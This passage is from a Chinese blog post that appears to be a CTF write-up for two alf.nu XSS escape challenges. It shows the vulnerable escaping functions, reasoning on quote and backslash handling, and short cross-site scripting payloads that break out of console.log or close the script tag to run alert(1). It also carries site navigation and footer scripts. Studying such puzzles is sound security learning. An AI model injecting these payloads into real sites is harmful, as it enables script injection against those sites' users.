+<h3 id="0x011"><a href="#0x011" class="headerlink" title="0x011"></a>0x011</h3><h5 id="题目：-17"><a href="#题目：-17" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// from alf.nu</span><br><span class="line">function render (s) &#123;</span><br><span class="line">  function escapeJs (s) &#123;</span><br><span class="line">    return String(s)</span><br><span class="line">            .replace(/\\/g, &apos;\\\\&apos;)</span><br><span class="line">            .replace(/&apos;/g, &apos;\\\&apos;&apos;)</span><br><span class="line">            .replace(/&quot;/g, &apos;\\&quot;&apos;)</span><br><span class="line">            .replace(/`/g, &apos;\\`&apos;)</span><br><span class="line">            .replace(/&lt;/g, &apos;\\74&apos;)</span><br><span class="line">            .replace(/&gt;/g, &apos;\\76&apos;)</span><br><span class="line">            .replace(/\//g, &apos;\\/&apos;)</span><br><span class="line">            .replace(/\n/g, &apos;\\n&apos;)</span><br><span class="line">            .replace(/\r/g, &apos;\\r&apos;)</span><br><span class="line">            .replace(/\t/g, &apos;\\t&apos;)</span><br><span class="line">            .replace(/\f/g, &apos;\\f&apos;)</span><br><span class="line">            .replace(/\v/g, &apos;\\v&apos;)</span><br><span class="line">            // .replace(/\b/g, &apos;\\b&apos;)</span><br><span class="line">            .replace(/\0/g, &apos;\\0&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  return `</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  var url = &apos;javascript:console.log(&quot;$&#123;s&#125;&quot;)&apos;</span><br><span class="line">  var a = document.createElement(&apos;a&apos;)</span><br><span class="line">  a.href = url</span><br><span class="line">  document.body.appendChild(a)</span><br><span class="line">  a.click()</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>思路，闭合console.log函数，再构造alert函数弹窗。<br>把”转换成\”但是\还是在””号内，无影响。然后闭合执行</p>
+<h5 id="payload：-14"><a href="#payload：-14" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;);alert(&quot;1</span><br></pre></td></tr></table></figure>
+<h3 id="0x012"><a href="#0x012" class="headerlink" title="0x012"></a>0x012</h3><h5 id="题目：-18"><a href="#题目：-18" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// from alf.nu</span><br><span class="line">function escape (s) &#123;</span><br><span class="line">  s = s.replace(/&quot;/g, &apos;\\&quot;&apos;)</span><br><span class="line">  return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>匹配”双引号，并替换为\”；<br>由于输入点在script标签外，则不能考虑html实体编码；<br>“替换成\”，在实际输出中可以在添一个\来转义掉第一个\绕过；</p>
+<h5 id="payload：-15"><a href="#payload：-15" class="headerlink" title="payload："></a>payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\&quot;);</span><br><span class="line">alert(1);</span><br><span class="line">//</span><br></pre></td></tr></table></figure>
+<p>也可以直接闭合最前面的<script>,然后创造一个新的<script>执行alert(1)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>参考：<a href="https://blog.csdn.net/AlexYoung28/article/details/82315538">https://blog.csdn.net/AlexYoung28/article/details/82315538</a></p>
+<p><a href="http://www.youi.xin/?p=341">http://www.youi.xin/?p=341</a></p>
+<p>其实咱也没搞明白xss到底是个啥，咱也不敢问，也不敢说，咱就只敢看着别人的wp刷刷题</p>
+</script></p>	
+	</div>
+	
+	<div id="current-post-cover" data-scr="/img/post-cover/14.jpg"></div>
+
+	<!-- relate post, comment...-->
+	<div class="investment-container">
+		<div class="investment-header">
+			<div class="investment-title-1">
+				<div class="on">相关文章</div>
+				<div>评论</div>
+				<div>分享</div>
+			</div>
+			<div class="investment-title-2">	            
+				
+	<span>
+		<a href="javascript: window.scrollTo(0, 0);">返回顶部</a>
+		
+		
+			<a href="/2019/08/01/攻防世界web新手wp（四）/" title="攻防世界web新手wp（四）" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+			</div>	
+		</div>
+		
+		<div class="investment-content">
+			<div class="investment-content-list">
+				
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/08/01/攻防世界web新手wp（四）/" title="攻防世界web新手wp（四）">
+								攻防世界web新手wp（四）			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								八月 1日, 2019				
+							</p>
+							<p class="relate-post-content">
+								攻防世界web新手题8、12题一个星期前的三道web新手题一直拖着没写wp…今天补出来。昨天一人跟我说我博客半年没更新了，我气急败坏的怼回去说我顶多一周没更新，结果打开博客一看，从24号到31号刚好一周…七月份放假后可以说过的相当放松...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/08/01/攻防世界web新手wp（四）/" title="攻防世界web新手wp（四）">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/post-cover/13.jpg" alt="攻防世界web新手wp（四）">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/07/24/攻防世界misc新手wp（一）/" title="攻防世界misc新手wp（一）">
+								攻防世界misc新手wp（一）			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								七月 24日, 2019				
+							</p>
+							<p class="relate-post-content">
+								攻防世界misc新手题4-6题
+pdf根据题目描述可知，flag可能会隐藏在图片下面。将图片移开的方法：
+
+用pdf编辑工具使图片缩小可以看到图片后面的flag
+利用在线工具：https://app.xunjiepdf.com/pdf...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/07/24/攻防世界misc新手wp（一）/" title="攻防世界misc新手wp（一）">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/post-cover/11.jpg" alt="攻防世界misc新手wp（一）">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/07/21/攻防世界web新手wp（三）/" title="攻防世界web新手wp（三）">
+								攻防世界web新手wp（三）			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								七月 21日, 2019				
+							</p>
+							<p class="relate-post-content">
+								攻防世界web新手题8-12题
+webxff_referer
+X老师告诉小宁其实xff和referer是可以伪造的。
+
+根据描述信息，知道题目应该与xff和referer相关，进入题目，看到
+于是用brup抓包，在http头加一条 X...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/07/21/攻防世界web新手wp（三）/" title="攻防世界web新手wp（三）">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/post-cover/10.jpg" alt="攻防世界web新手wp（三）">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/07/18/攻防世界web新手wp（二）/" title="攻防世界web新手wp（二）">
+								攻防世界web新手wp（二）			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								七月 18日, 2019				
+							</p>
+							<p class="relate-post-content">
+								攻防世界web新手题4-6题
+webbackup
+X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！
+
+这道题考察的是备份文件漏洞（Backup-File Artifacts），该漏洞可能存在于编辑器自动备份...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/07/18/攻防世界web新手wp（二）/" title="攻防世界web新手wp（二）">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/post-cover/9.jpg" alt="攻防世界web新手wp（二）">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/07/17/攻防世界web新手wp（一）/" title="攻防世界web新手wp（一）">
+								攻防世界web新手wp（一）			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								七月 17日, 2019				
+							</p>
+							<p class="relate-post-content">
+								攻防世界web新手题1-3题
+Miscgive_you_flag修复二维码扫描得到flag打开gif图会看见丘比龙数完钞票会展示二维码，使用Stegsolve打开文件选择Frame Browser帧浏览器对动图进行分解,得到含有二维码...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/07/17/攻防世界web新手wp（一）/" title="攻防世界web新手wp（一）">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/post-cover/8.jpg" alt="攻防世界web新手wp（一）">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/06/01/2019ISCC-Misc/" title="2019ISCC Misc">
+								2019ISCC Misc			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 1日, 2019				
+							</p>
+							<p class="relate-post-content">
+								2019ISCC Misc全部wp
+01 隐藏的信息题目给出的文件10126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/06/01/2019ISCC-Misc/" title="2019ISCC Misc">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/post-cover/2.jpg" alt="2019ISCC Misc">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/05/03/2019ISCC-web1-（代码审计）/" title="2019ISCC web1 （代码审计）">
+								2019ISCC web1 （代码审计）			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 3日, 2019				
+							</p>
+							<p class="relate-post-content">
+								2019ISCC web1题目
+题解拿到题目直接给出源码：
+1234567891011121314151617&lt;?phperror_reporting(0);require &apos;flag.php&apos;;$value...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/05/03/2019ISCC-web1-（代码审计）/" title="2019ISCC web1 （代码审计）">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/post-cover/1.jpg" alt="2019ISCC web1 （代码审计）">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/07/24/php弱类型比较/" title="php弱类型比较">
+								php弱类型比较			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								七月 24日, 2019				
+							</p>
+							<p class="relate-post-content">
+								php是弱类型语言，它含有很多隐式的转换。常见的php弱类型，主要分为类型转换问题和内置函数参数的松散性两类。
+类型转换问题类型转换是无法避免的问题。例如需要将GET或者是POST的参数转换为int类型，或者是两个变量不匹配的时候，P...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/07/24/php弱类型比较/" title="php弱类型比较">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/post-cover/12.jpg" alt="php弱类型比较">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/05/28/zkctf部分wp2/" title="zkctf部分wp2">
+								zkctf部分wp2			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 28日, 2019				
+							</p>
+							<p class="relate-post-content">
+								  zkctf部分wp2
+Web guess game查看源代码，发现其实又是代码审计
+1234567891011121314151617181920212223242526272829&lt;!-- error_reporting(...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/05/28/zkctf部分wp2/" title="zkctf部分wp2">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/post-cover/4.jpg" alt="zkctf部分wp2">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/05/16/zkctf部分wp/" title="zkctf部分wp">
+								zkctf部分wp			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 16日, 2019				
+							</p>
+							<p class="relate-post-content">
+								zkctf部分题目的wp
+Web upload打开题目地址发现是空白查看源代码看到upload.php所以把file改成upload.php，发现是个文件上传，且只能上传jpg格式的文件写php一句话木马上传时用bp抓包对比上传正常的...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/05/16/zkctf部分wp/" title="zkctf部分wp">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/post-cover/3.jpg" alt="zkctf部分wp">
+							</a>
+						</div>
+					</li>											
+			
+			
+		</ul>
+	
+</div>	
+			</div>
+			<div class="investment-content-list">
+				<div class="layout-comment">
+
+	
+
+		
+
+			<!-- I don't know !!!-->
+			<div>Please check the comment setting in config.yml of hexo-theme-Annie!</div>
+			
+		
+		
+	
+
+</div>
+			</div>
+			<div class="investment-content-list">
+				<div class="layout-share">
+	
+	
+
+		
+			
+			<!-- socialShare share -->
+			<div class="social-share"></div>
+
+<!--  css & js -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+			
+		
+		
+	
+</div>
+
+
+			</div>
+		</div>	
+	</div>
+	</div>
+</div>
+
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+	
+
+
+<!-- show math formula -->
+
+
+
+	 
+	<script src="/plugin/clipboard/clipboard.js"></script>
+	<script>
+		// Copy code !
+	    function codePreprocessing() {
+	        $("#article-content .highlight").each(function() {
+
+	            $(this).wrap('<div id="post-code"></div>');
+
+	        })
+
+	        $("#article-content #post-code").each(function() {
+
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            var temp = $(this).next().attr('class'),
+	                language = ((temp.length > 9) && (temp != null)) ? temp.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+
+	            $(this).append('<span class="copy-btn"><i class="fa fa-copy" aria-hidden="true"></i></span>');
+
+	        });
+	    }
+
+		function codeCopy() {
+		    $('#article-content #post-code').each(function(i) {
+		        var codeCopyId = 'codeCopy-' + i;
+
+		        var codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+
+		    
+			var clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn copy-status');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');
+			    
+			});
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		
+
+		}
+
+		if ($('.layout-post').length) {
+		    codePreprocessing();
+		    codeCopy();
+		} 
+	</script>
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+<script type="text/javascript">
+	var titleID = $('.article-title a'),
+		imageID = $('.article-content img'),
+		videoID = $('.article-content video');
+
+	var postTitle = titleID.text() ? titleID.text() : "No post title!";
+
+	imageID.each(function() {
+		var imgPath = $(this).attr('src'),
+			imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+
+		//给每个匹配的<img>元素打包, 即添加父元素<a>
+		$(this).wrap('<a data-fancybox="gallery" data-caption=" 《 ' + postTitle + ' 》 ' + imgTitle + ' "  href=" ' + imgPath + ' "> </a>');
+	});
+
+	videoID.each(function() {
+		var videoPath = $(this).attr('src');
+
+		//给每个匹配的<img>元素打包, 即添加父元素<a>
+		$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+	});
+	//TODO：支持html5 video
+
+	if($('#layout-post').length) {
+		$('[data-fancybox="gallery"]').fancybox({
+			loop: true,
+			buttons: [
+				"zoom",
+				"share",
+				"slideShow",
+				"fullScreen",
+				//"download",
+				"thumbs",
+				"close"
+			],
+			protect: false
+		});
+	}
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div class="social">
+		<ul>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-github"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-weibo"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-pinterest"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-instagram"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-twitter"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/atom.xml" target="_blank">
+				<i class="fa fa-rss"></i>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+		
+	<div class="copyright">
+		<p>
+			 
+				&copy;2017 - 2019, content by 刘宸昕. All Rights Reserved.
+			
+			
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+		
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+
+		<span id="busuanzi_container_page_pv">
+	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+		</span>
+
+	
+
+
+
+
+		</p>
+		<p>
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- set '1' to show motto in all pages! -->
+
+	<script src="/plugin/motto/motto.js"></script>
+	
+	<script type="text/javascript">
+		$(".motto").html( getMingYanContent() );
+	</script>	
+
+
+
+
+
+<!-- love effect -->
+
+	<script src="/plugin/love/love.js"></script>
+
+
+<!-- back to top -->
+
+	
+	<div id="totop">
+  		<a href="javascript:;" name="TOTOP" class="fa fa-arrow-up"></a>
+	</div>
+
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<script src="/plugin/vibrant/vibrant.js"></script>
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imgLazyLoader/yall.min.js"></script>
+<script src="/plugin/imgResize/jquery.resizeimagetoparent.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/js/resizediv.js"></script>
+<script src="/js/main.js"></script>
+	</body>	
+</html>
